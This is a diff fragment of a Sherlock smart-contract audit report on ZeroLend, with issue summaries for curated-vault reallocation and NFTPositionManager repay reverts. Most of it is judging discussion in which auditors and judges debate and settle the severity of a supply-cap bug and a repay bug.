+This report should be valid and is not a duplicate of https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/399 which is about `maxWithdraw` and `maxRedeem` being non-ERC4626 compliant due to a bug in `_withdrawable()`. 
+On the other hand, this report describes that `_supplyPool()` ignoring the underlying pool cap can result in unexpectedly reverting deposits or an inefficient reordering of the supplyQueue.
+
+
+To address the comment left on https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193 that was referenced on this report:
+
+>"setCap is an admin operation and It can be expected that the curators will set (there's no reason to assume otherwise) a similar pool(vault) cap as the underlying pool"
+
+I believe there is a flaw in this reasoning.
+
+- The `supplyCap` stored in `CuratedVaultStorage::config[pool].cap` is the cap of deposits into a given underlying pool from this `CuratedVault`.
+- The underlying pool cap stored in the `DataTypes.ReserveConfigurationMap` for the underlying pool describes the total deposits to this underlying pool from all sources (including but not limited to this `CuratedVault`).
+
+It's true the curator sets the `supplyCap` for the curated vault, however they are not in control of other deposts to the underlying pool. So, attempting to set them to similar values will only prevent this issue as long as there are no other deposits in the underlying pool, which is not a valid assumption for a curator to make.
+
+Therefore both impacts in this report can occur regardless of the admin-set value.
+
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> This report should be valid and is not a duplicate of https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/399 which is about `maxWithdraw` and `maxRedeem` being non-ERC4626 compliant due to a bug in `_withdrawable()`. 
+> On the other hand, this report describes that `_supplyPool()` ignoring the underlying pool cap can result in unexpectedly reverting deposits or an inefficient reordering of the supplyQueue.
+> 
+> 
+> To address the comment left on https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193 that was referenced on this report:
+> 
+> >"setCap is an admin operation and It can be expected that the curators will set (there's no reason to assume otherwise) a similar pool(vault) cap as the underlying pool"
+> 
+> I believe there is a flaw in this reasoning.
+> 
+> - The `supplyCap` stored in `CuratedVaultStorage::config[pool].cap` is the cap of deposits into a given underlying pool from this `CuratedVault`.
+> - The underlying pool cap stored in the `DataTypes.ReserveConfigurationMap` for the underlying pool describes the total deposits to this underlying pool from all sources (including but not limited to this `CuratedVault`).
+> 
+> It's true the curator sets the `supplyCap` for the curated vault, however they are not in control of other deposts to the underlying pool. So, attempting to set them to similar values will only prevent this issue as long as there are no other deposits in the underlying pool, which is not a valid assumption for a curator to make.
+> 
+> Therefore both impacts in this report can occur regardless of the admin-set value.
+> 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+@Nihavent The impact is very similar to issues #337 and #431. 
+
+You can see this comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/337#issuecomment-2402013737
+
+I see no reason for it to be any different here. 
+
+**Nihavent**
+
+@cvetanovv the root cause is similar to the issues you referenced but the impact here is higher. 
+
+The maximum impact on the issues you linked is non compliance with the EIP which can break external integrations, as you mentioned this does not necessarily qualify as medium impact. 
+
+
+The maximum impact on this issue is reverting deposits when the pools have capacity to support the deposit (see attack path). This is an implementation bug which is broken contract functionality. 
+Additionally, assets can be allocated to underlying pools in an order which differs from the depositQueue. 
+
+This issue has nothing to do with EIP compliance. 
+
+For reference this issue has the same root cause and impact as https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178
+
+**cvetanovv**
+
+@Nihavent I agree that in this issue, the impact is one idea more serious, and we enter the category "broken contract functionality".
+
+Planning to accept the escalation and remove the duplication with #399. I will duplicate this issue(#433) with #193 and #339. This issue will be the main.
+
+**0xjuaan**
+
+Hi @cvetanovv, please consider the following [judging comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193#issuecomment-2364150838) regarding why this issue is invalid.
+
+Vault curators should not set a cap that is greater than the cap of underlying pools. It makes no sense to do so. For example if the underlying pool allows a max of `10e18`, then vault curators should set a deposit cap that is less than or equal to 10e18. This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.
+
+
+**Nihavent**
+
+> Hi @cvetanovv, please consider the following [judging comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193#issuecomment-2364150838) regarding why this issue is invalid.
+> 
+> Vault curators should not set a cap that is greater than the cap of underlying pools. It makes no sense to do so. For example if the underlying pool allows a max of `10e18`, then vault curators should set a deposit cap that is less than or equal to 10e18. This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.
+
+This is not true as I explained here https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2391351629
+
+Imagine the super pool has 2 underlying pools each with an underlying cap of 10e18. The SuperPool admin sets their caps to 10e18 as you said. Each underlying pool receives deposits from other sources to the value of 9e18. Now a user trying to deposit 2e18 into the SuperPool will revert even though this deposit could be split across the two underlying pools. 
+
+Therefore carefully setting the SuperPool cap for a given pool is only an effective mitigation if there are 0 deposits from other sources in the underlying pool. As I previously mentioned this is an unrealistic assumption for anyone to make. 
+
+>”This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.”
+
+This is also incorrect because in the above example the SuperPool cap set for the two pools could be 5e18 and the issue still exists. 
+
+
+I believe this is straightforward but if you require a POC showing the issue when the SuperPool cap is < the underlying pool cap I can write one tomorrow. 
+
+
+**0xjuaan**
+
+Yeah actually you're right @Nihavent, the issue can still occur. I still think that the issue would not exist if vault curators set an appropriate cap, and that is why Morpho decided to implement it this way. In the case that an event like the described one occurs, the curators can reduce the cap of the pool such that only 1e18 can be deposited into each pool, and this prevents the revert.
+
+That is the reason why `submitCap()` has no timelock for reducing a pool cap, but does have a timelock for increasing the pool cap. It's because reducing pool caps should be able to happen to prevent the described issue. 
+
+**Nihavent**
+
+Edit: Updated this comment with a more considered and complete response.
+
+@0xjuaan thanks for acknowledging the example I provided which shows the issue is possible regardless of carefuly set admin values. I do concede this issue is less likely to occur (but not impossible) if the admin continuously sets conservatively low SuperPool caps for the underlying pools (relative to available caps in the underlying pools). However, I will now explain why I don't believe the SuperPool cap should or would ever be used for this purpose. 
+
+There are two relevant caps we're discussing:
+1. The SuperPool cap which is the maximum allocation that a SuperPool will allocate to a given underlying pool, and
+2. The underlying pool's cap which is the maximum liquidity from all sources that can be deposited into the pool
+
+We can make inferences from the fact that these two caps exist:
+
+- The SuperPool cap (1) is set by curators to represent the ideal maximum allocation to an underlying pool. This is one of the risk management tools at the disposal of the SuperPool admins. 
+- If the intended use case of the SuperPool cap (1) was to always have it set to the available cap in the underling pool (2), this could have been achieved programatically and in fact the parameter (1) wouldn't exist. 
+
+[This comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2402719025) suggests that a partial mitigation to this issue is to burden SuperPool curators with administrative work of continuously checking for a reduction in available cap in all underlying pools, and reducing the corresponding SuperPool cap to reflect this change. The evidence given for this is there is no timelock on reduction in superPool caps. I believe there are problems with this:
+
+1. It completely reduces the purpose of the SuperPool cap from a risk management/capital allocation tool to an administrative task for curators to update (in order to prevent edge-case deposit reverts). 
+2. We can reasonably expect that curators would not update the cap in this way because:
+   - The effort / benefits tradeoff doesn't make sense fo them to use the parameter in this way. They would care more about achieving their ideal capital allocation than preventing deposit reverts into the SuperPool.
+   - It is a waste of gas to update it potentially several times per day per underlying pool
+   - It is logistically impractical to poll for reductions in available caps across all underlying pools, they would need a bot to do this and then  backrun underlying pool `supply()` calls with `submitCap()` calls. 
+   - Whilst the cap can be reduced without a timelock, it requires a timelock to increase. Therefore if they reduced it to protect against this issue, and then there is a withdrawal from the underlying pool, they can't increase the cap again quickly. Therefore, their pool loses the chance to deposit more liquidity and a different SuperPool that wasn't continuously reducing their cap gets to deposit this liquidity instead.
+
+So whilst it’s technically possible to reduce the likelihood of this issue with admin actions, it is unreasonable to expect the admin to use the parameter for this purpose. 
+   
+
+**Honour-d-dev**
+
+I also believe this issue is not worth a medium severity, `submitCap()` is an admin operation and it has been shown that the protocol is designed in such a way that its easy for the admin to handle this if it ever happens (and the chances of it happening are vey slim if the admin sets a reasonable cap to begin with)
+
+**Nihavent**
+
+> I also believe this issue is not worth a medium severity, `submitCap()` is an admin operation and it has been shown that the protocol is designed in such a way that its easy for the admin to handle this if it ever happens (and the chances of it happening are vey slim if the admin sets a reasonable cap to begin with)
+
+I agree the issue is not going to occur frequently due to it being a bug that occurs in edge cases. To my knowledge the likelihood of the bug does not play a role in Sherlock’s judging rules. 
+
+Check my previous comment for an explanation as to why setCap would need to be misused to reduce the likihood of this bug. 
+
+It has also been shown that this issue can occur regardless of admin set values. 
+
+**cvetanovv**
+
+I believe this issue should be Low severity.
+
+While it could lead to some deposit reverts or inefficiencies in the `supplyQueue`, it's important to note that this is an admin-controlled action. Admins have the ability to set reasonable caps and monitor pool configurations effectively to prevent such situations. 
+
+Additionally, there is no direct loss of funds.
+
+For these reasons, I believe that this issue is of low severity.
+
+Planning to reject the escalation and leave the issue as is.
+
+**Nihavent**
+
+Hi, thanks for consideration of the issue. 
+
+It has been shown that this issue can occur regardless of the most reasonable admin setCap value. This is because the available liquidity in underlying pools can change quickly. 
+
+For this parameter to be used in a way to almost completely avoid this issue, the cap would need to be set extremely low which defeats the purpose of the pool being in the supply queue. 
+
+Additionally, as I explained in detail [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2402738726) the setCap functionality should not and will not be used to reduce the likelihood of this issue. 
+Requiring curators to setCap to avoid this issue costs them the functionality of setting their optimal liquidity allocation to each pool, ie. they lose the intended functionality of the parameter in order to prevent edge-case deposit reverts. Therefore no rational actor would use the parameter in this way. 
+
+If the protocol didn’t want curators to be able to freely set caps, the parameter wouldn’t exist and vaults would inherit the available caps from the underlying pools. 
+
+As it stands, with admins freely setting their optimal caps as per the design, there is a bug in the implementation. 
+
+
+**Honour-d-dev**
+
+This issue is a low severity
+
+There is no loss of funds or broken functionality or any substantial impact, the only issue here is a short/temporary inconvenience for the user that can be immediately and easily fixed by admin adjusting the cap or reordering the queue if necessary 
+
+**cvetanovv**
+
+This issue is а valid Low severity.
+
+Here are the rules for Medium severity:
+https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue
+
+>1. Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+>2. Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.
+
+In this issue, there is neither loss of funds nor broken functionality.
+
+My decision to reject the escalation remains.
+
+**Nihavent**
+
+If this issue does not have enough impact for medium severity, how is this issue a valid medium? https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178
+
+I understand that reports will be judged on a case-by-case basis, but there is no meaningful difference between the protocols with respect to this issue, and the submitted issues are the same. Therefore for consistency if there is enough impact in [that](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178) issue for medium, there must be enough impact in this issue for medium. 
+How are Watsons able to gauge which issues consistitue a medium if this level of consistency is not present?
+
+- Both issues have a vault which sometimes fails to deposit into underlying pools in the queue because the available liquidity in the underlying pool is not checked. 
+- Both issues can result in deposit reverts or undesired reorderings of the queue.
+- Both issues have an admin-set cap for the vault's maximum deposit into the underlying pool
+- Both issues have the same pre-conditions
+- Both issues have the same fix
+
+**cvetanovv**
+
+@Nihavent You are right about that. As you can see in the comments, I was hesitant about having broken functionality. After the protocol comment, then I decided it was Medium because it was important for them to have the function not revert.
+
+In this contract(`CuratedVaultSetters.sol`), we also have indications that the function should not revert, so I think we have broken functionality here also: https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L133
+
+Planning to accept the escalation and make this issue Medium.
+
+**0xSpearmint**
+
+Hi @cvetanovv [193](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193) is also a duplicate of this issue.
+
+**cvetanovv**
+
+> Hi @cvetanovv [193](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193) is also a duplicate of this issue.
+
+Thanks for the mention. I will also duplicate #193 to this issue.
+
+**WangSecurity**
+
+Result:
+Medium 
+Has duplicates
+
+
+**sherlock-admin2**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [Nihavent](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433/#issuecomment-2391351629): accepted
+
+# Issue M-13: Curated Vault allocators cannot `reallocate()` a pool to zero due to attempting to withdraw 0 tokens from the underlying pool 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/434 
 
 ## Found by 
-000000, 0xAristos, 0xc0ffEE, A2-security, CL001, KupiaSec, Nihavent, Obsidian, Varun\_05, aman, dany.armstrong90, hyh, iamnmt, karsar, rilwan99, stuart\_the\_minion, theweb3mechanic, trachev, wickie, zarkk01
+000000, 0xAristos, 0xc0ffEE, A2-security, KupiaSec, Nihavent, Obsidian, Varun\_05, aman, dany.armstrong90, hyh, iamnmt, karsar, rilwan99, stuart\_the\_minion, theweb3mechanic, trachev, wickie, zarkk01
 ### Summary
 
 The `reallocate()` function is the primary way a curated vault can remove liquidity from an underlying pool, so being unable to fully remove the liquidity is problematic. However, due to a logic issue in the implementation, any attempt to `reallocate()` liquidity in a pool to zero will revert. 
@@ -5834,78 +6093,12 @@ The comment "Guarantees that unknown frontrunning donations can be withdrawn, in
   }
 ```
 
-# Issue M-20: `BNB` token can't be used if ZEROLEND deploys on `Linea` because chainlink oracle price feed doesn't support it 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/460 
-
-## Found by 
-0xDemon
-### Summary
-
-Based on the contest `README`, 
-
-> **On what chains are the smart contracts going to be deployed?**
-Ethereum and Linea primarily. And after that any EVM-compatible network.
-> 
-
-and
-
-> **If you are integrating tokens, are you allowing only whitelisted tokens to work with the codebase or any complying with the standard? Are they assumed to have certain properties, e.g. be non-reentrant? Are there any types of [[weird tokens](https://github.com/d-xo/weird-erc20)](https://github.com/d-xo/weird-erc20) you want to integrate?**
-> 
-> 
-> Only standard ERC20 tokens + USDC and BNB are in-scope.
-> 
-
-The ZEROLEND protocol assumes that each chain that will be used to deploy the related smart contract has a price feed that supports each asset, but in reality, the chainlink oracle price feed does not support the `BNB` token on the `Linea` chain. This results in the `BNB` token being completely unusable and this breaks the main invariant that the `BNB` token is included in the token whitelist for each chain that will be supported (`Ethereum` mainnet, `Linea`, and `EVM-compatible networks`).
-
-The main reason `BNB` is completely unusable is because when the pool is initiated and the address from the oracle is verified it will revert because the price feed is not available.
-
-### Root Cause
-
-The choice to use chainlink oracle price feed and assume there is a price feed for `BNB` on the `Linea` chain
-
-[PoolGetters.sol:158-163](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L158-L163)
-
-### Internal pre-conditions
-
-_No response_
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-_No response_
-
-### Impact
-
-`BNB` token being completely unusable and this breaks the main invariant that the `BNB` token is included in the token whitelist for each chain that will be supported (`Ethereum` mainnet, `Linea`, and `EVM-compatible networks`)
-
-### PoC
-
-All available chainlink oracle price feed for `Linea` chain can be seen [here](https://data.chain.link/feeds)
-
-### Mitigation
-
-Consider adding another price feed for `BNB` token if protocol still want to support `BNB` token
-
-
-
-## Discussion
-
-**nevillehuang**
-
-Since it is explicitly stated in READ.ME that BNB + Linea chain is to be supported, I believe this is valid since READ.ME information overrides all other information. However, can also see arguments for invalidation based on admin configurations, will leave it to escalation discussions.
-
-Note: See [here](https://data.chain.link/feeds) for chainlink feeds on linea chain
-
-# Issue M-21: NFTPositionManager's `repay()` and `repayETH()` are unavailable unless preceded atomically by an accounting updating operation 
+# Issue M-14: NFTPositionManager's `repay()` and `repayETH()` are unavailable unless preceded atomically by an accounting updating operation 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467 
 
 ## Found by 
-000000, A2-security, DenTonylifer, JCN, Obsidian, coffiasd, denzi\_, hyh, stuart\_the\_minion, thisvishalsingh, zarkk01
+000000, A2-security, JCN, Obsidian, denzi\_, hyh, stuart\_the\_minion, thisvishalsingh, zarkk01
 ### Summary
 
 The check in `_repay()` cannot be satisfied if pool state was not already updated by some other operation in the same block. This makes any standalone `repay()` and `repayETH()` calls revert, i.e. core repaying functionality can frequently be unavailable for end users since it's not packed with anything by default in production usage
@@ -6067,12 +6260,100 @@ Consider adding direct reserve update before reading from the state, e.g.:
 ```
 
 
-# Issue M-22: The repayment process in the NFTPositionManager can sometimes be reverted 
+
+
+## Discussion
+
+**0xjuaan**
+
+shouldn't this be high severity because the only way to retrieve the stuck funds would be for each individual user to somehow atomically update the interest rate before repayment?
+
+**Haxatron**
+
+Escalate
+
+Final time to use this 
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> Final time to use this 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+This is the High severity rule:
+
+> Definite loss of funds without (extensive) **limitations of external conditions**. The loss of the affected party must exceed 1%.
+
+Medium: 
+
+> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+> Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.
+
+We can see that in this issue, we have no loss of funds without any constrains.
+
+The main impact is that the `repay()` functionality may not work in certain circumstances, and more matches the rule for Medium severity. : `Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party`.
+
+Planning to reject the escalation and leave the issue as is.
+
+
+
+**0xjuaan**
+
+@cvetanovv 
+
+The reason why it's high severity is that the user will not be able to withdraw a certain amount of collateral, since they cant repay.
+
+Lets say they deposit $100 and borrow $80. (LTV is 80%)
+
+Now they cant repay the $80, so their $100 is stuck forever. So they effectively lost $20. 
+
+**DemoreXTess**
+
+@0xjuaan How it's stuck I don't understand ? It will revert after if statement.
+
+**0xjuaan**
+
+@DemoreXTess repayment reverts, so they cant withdraw their collateral (they need to repay debt in order to withdraw collateral), so they lose funds since collateral value > debt value
+
+**iamnmt**
+
+I believe this issue is low severity.
+
+The user can call `pool.forceUpdateReserve` before `repay` and `repayETH` to update the `borrowIndex`, and then the repayment will not revert. If the user fails to do so, then it is a user mistake.
+
+**cvetanovv**
+
+As I wrote in my previous comment `repay()` and `repayETH()` do not work as they should. This is the main impact and because of this, I classify this issue as Medium severity. We have broken functionality.
+
+My decision to reject the escalation remains.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [haxatron](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467/#issuecomment-2394853299): rejected
+
+# Issue M-15: The repayment process in the NFTPositionManager can sometimes be reverted 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/488 
 
 ## Found by 
-Obsidian, dany.armstrong90, ether\_sky, hyh
+Obsidian, dany.armstrong90, ether\_sky
 ## Summary
 Users can `supply` `assets` to the `pools` through the `NFTPositionManager` to earn `rewards` in  `zero` tokens. 
 Functions like `deposit`, `withdraw`, `repay`, and `borrow` should operate normally. 
